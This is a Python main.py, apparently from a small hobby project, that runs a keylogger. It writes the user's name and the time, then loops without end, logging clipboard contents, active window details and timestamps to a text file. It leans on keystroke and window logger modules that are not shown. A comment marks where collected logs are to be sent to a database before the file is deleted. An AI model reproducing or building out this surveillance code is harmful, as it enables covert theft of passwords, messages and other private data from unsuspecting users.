########################################################################################################################
#               This is the main.py for this project where the core of the project's code should be.                   #
#               Try to keep the code as modular as possible by separating it into functions and classes.               #
#                                                                                                                      #
#               - Keano (03-04-2023)                                                                                   #
########################################################################################################################

# Library imports here
import window_info_logger as wilogger
import keystrokes_and_clipboard_logger as kclogger
import os
import getpass
import utility_functions as uf
from datetime import datetime
import time


def initialise_log_file(text_file):
    user = getpass.getuser()
    text_file.write(f"User: {user}" + "\n")
    text_file.write(f"Date & time: {datetime.now()}\n")
    text_file.write("======================================================" + "\n")


# Main code here
def main():
    if os.path.isfile("test.txt"):
        # Add code for sending data to database here.
        os.remove("test.txt")
    old_time = time.time()
    note_interval_seconds = 5  # There must be a better name for this.

    with open('test.txt', 'a+', encoding="utf-8") as f:
        initialise_log_file(f)  # Note user info and starting date + time of keylogger.
        kc_logger_object = kclogger.KeysClipboardLogger(f)  # Start keylogger.
        window_logger_object = wilogger.WindowLogger(f)  # Start window logger.
        while True:
            if uf.check_if_time_passed(old_time, note_interval_seconds):
                old_time = time.time()
                uf.log_time(f, old_time)
            window_logger_object.log_window()
            kc_logger_object.log_clipboard()


if __name__ == '__main__':
    main()
